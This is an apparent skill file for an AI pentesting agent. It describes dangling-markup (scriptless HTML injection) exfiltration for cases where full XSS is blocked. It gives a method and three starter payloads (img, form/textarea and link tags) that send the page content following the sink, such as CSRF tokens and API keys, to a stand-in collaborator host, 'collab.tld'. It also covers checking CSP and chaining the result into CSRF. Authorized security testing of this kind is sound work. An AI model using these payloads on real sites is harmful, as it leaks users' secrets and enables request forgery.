---
name: dangling-markup-exfil
description: >-
  Exploit dangling-markup / scriptless injection (CWE-79 adjacent): when full XSS is blocked
  (CSP/sanitizer) but partial HTML injection is possible, use unterminated attributes/tags to
  capture subsequent page content (CSRF tokens, secrets) and exfil to an attacker host. Invoke
  when HTML injection works but script execution is prevented and sensitive markup follows the sink.
family: 07-client-side
type: exploit
owasp: [A03:2021]
cwe: [CWE-79]
requires: [scope-guard, evidence-recorder]
authorization: required
---

# Dangling Markup Exfiltration

## Invoke when
- Partial HTML injection is possible but script is blocked, and secrets sit later in the DOM.

## Methodology
1. Inject an unterminated attribute/tag so the browser swallows following markup as data.
2. Point the resource load (img/form/link) at a collaborator to leak the captured span.
3. Target nearby CSRF tokens, emails, or API keys rendered after the injection point.

## Starter payloads
- `<img src='//collab.tld?` (dangling — captures until next quote)
- `<form action=//collab.tld><textarea>` (captures following content into a field)
- `<link rel=stylesheet href='//collab.tld?`.

## False-positive filters
- CSP that restricts `img-src`/`form-action`/`style-src` to self blocks the exfil channel — check CSP first.

## Chains to
- `content-security-policy-bypass`, `csrf` (leaked token → forge request), `chain-builder`.
